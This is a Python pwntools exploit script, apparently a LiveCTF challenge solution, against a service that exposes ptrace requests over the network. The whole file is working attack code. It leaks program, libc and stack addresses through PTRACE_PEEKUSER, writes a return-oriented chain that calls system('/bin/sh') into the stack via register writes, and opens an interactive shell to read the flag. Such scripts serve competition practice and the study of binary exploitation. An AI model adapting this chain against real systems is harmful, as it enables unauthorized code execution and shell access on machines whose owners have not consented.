#!/usr/bin/env python

import os
import sys

from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

# BINARY_PATH = "./challenge"

# elf = ELF(BINARY_PATH)

# if os.path.exists(LIBC_PATH):
#     log.debug("loading chal libc")
#     libc = ELF(LIBC_PATH)
# else:
#     log.debug("loading system libc")
#     libc = ELF("/usr/lib/libc.so.6")

p: pwnlib.tubes.tube

def get_cxn():
    return remote(HOST, PORT)


def ptrace(req, addr, data, again=True):
    p.sendlineafter(b"What ptrace request do you want to send?\n", hex(req))
    p.sendlineafter(b"What address do you want?\n", hex(addr))
    p.sendlineafter(b"What do you want copied into data?", hex(data))

    p.recvuntil(b"ptrace returned ")
    ret = int(p.recvline(b"ptrace returned ").strip(), 16)

    p.sendlineafter(b"0/1)?\n", b"1" if again else b"0")

    return ret

PTRACE_TRACEME   = 0
PTRACE_PEEKTEXT  = 1
PTRACE_PEEKDATA  = 2
PTRACE_PEEKUSER  = 3
PTRACE_POKETEXT  = 4
PTRACE_POKEDATA  = 5
PTRACE_POKEUSER  = 6
PTRACE_CONT      = 7
PTRACE_KILL      = 8
PTRACE_SINGLESTEP  = 9
PTRACE_GETREGS   = 0x0C
PTRACE_SETREGS   = 0x0D
PTRACE_GETFPREGS  = 0x0E
PTRACE_SETFPREGS  = 0x0F
PTRACE_ATTAC    = 0x10
PTRACE_DETAC    = 0x11
PTRACE_GETFPXREGS  = 0x12
PTRACE_SETFPXREGS  = 0x13
PTRACE_SYSCALL   = 0x18
PTRACE_GET_TREAD_AREA  = 0x19
PTRACE_SET_TREAD_AREA  = 0x1A
PTRACE_ARC_PRCTL  = 0x1E
PTRACE_SYSEMU    = 0x1F
PTRACE_SYSEMU_SINGLESTEP  = 0x20
PTRACE_SINGLEBLOCK  = 0x21
PTRACE_SETOPTIONS  = 0x4200
PTRACE_GETEVENTMSG  = 0x4201
PTRACE_GETSIGINFO  = 0x4202
PTRACE_SETSIGINFO  = 0x4203
PTRACE_GETREGSET  = 0x4204
PTRACE_SETREGSET  = 0x4205
PTRACE_SEIZE     = 0x4206
PTRACE_INTERRUPT  = 0x4207
PTRACE_LISTEN    = 0x4208
PTRACE_PEEKSIGINFO  = 0x4209
PTRACE_GETSIGMASK  = 0x420A
PTRACE_SETSIGMASK  = 0x420B
PTRACE_SECCOMP_GET_FILTER  = 0x420C
PTRACE_SECCOMP_GET_METADATA  = 0x420D
PTRACE_GET_SYSCALL_INFO  = 0x420E
PTRACE_GET_RSEQ_CONFIGURATION  = 0x420F

def pwn(STACK_OFFSET):
    global p
    p = get_cxn()

    # read rip
    # @8 == 0x55895c885d68
    # img base = 0x0055895c882000

    # @88 == libc 0x7f9a46aeabc7
    # libc base 0x007f9a46a00000

    # @152 == stack
    # for i in range(0,258,8):
    #     log.info(f"reg @ {i}: " + hex(ptrace(PTRACE_PEEKUSER, i, 0)))
    #     p.sendlineafter(b"0/1)?\n", b"1")

    ELF_OFFSET = 0x3d68
    LIBC_OFFSET = 0xeabc7
    elf_address = ptrace(PTRACE_PEEKUSER, 8, 0) - ELF_OFFSET
    libc_address = ptrace(PTRACE_PEEKUSER, 88, 0) - LIBC_OFFSET
    stack_addr = ptrace(PTRACE_PEEKUSER, 0x98, 0) + STACK_OFFSET
    print(hex(stack_addr))

    pop_rdi = libc_address + 0x2a3e5
    system = libc_address + 0x50d60 
    binsh = libc_address + 0x1d8698
    ret = libc_address + 0x29cd6

    log.info(f"stack addr: {hex(stack_addr)}")

    o0 = ptrace(PTRACE_POKEUSER, 0x0, 0)
    o1 = ptrace(PTRACE_POKEUSER, 0x8, 0)
    o2 = ptrace(PTRACE_POKEUSER, 0x10, 0)
    o3 = ptrace(PTRACE_POKEUSER, 0x18, 0)

    ptrace(PTRACE_POKEUSER, 0x0, ret)
    ptrace(PTRACE_POKEUSER, 0x8, pop_rdi)
    ptrace(PTRACE_POKEUSER, 0x10, binsh)
    ptrace(PTRACE_POKEUSER, 0x18, system)

    ptrace(PTRACE_GETREGS, 0x0, stack_addr)

    ptrace(PTRACE_POKEUSER, 0x0, o0)
    ptrace(PTRACE_POKEUSER, 0x8, o1)
    ptrace(PTRACE_POKEUSER, 0x10, o2)
    ptrace(PTRACE_POKEUSER, 0x18, o3, again=False)

    #gdb.attach(p)

    p.interactive()
    p.sendline(b'./submitter')
    flag = p.recvline_contains(b'LiveCTF{').decode().strip()
    log.info('Flag: %s', flag)
    sys.exit(0)

if __name__ == "__main__":
    pwn(0x180)
    # for i in range(0x60, 0x200, 8):
    #     print(f"==== trying {hex(i)}")
    #     try:
    #         pwn(i)
    #     except:
    #         pass
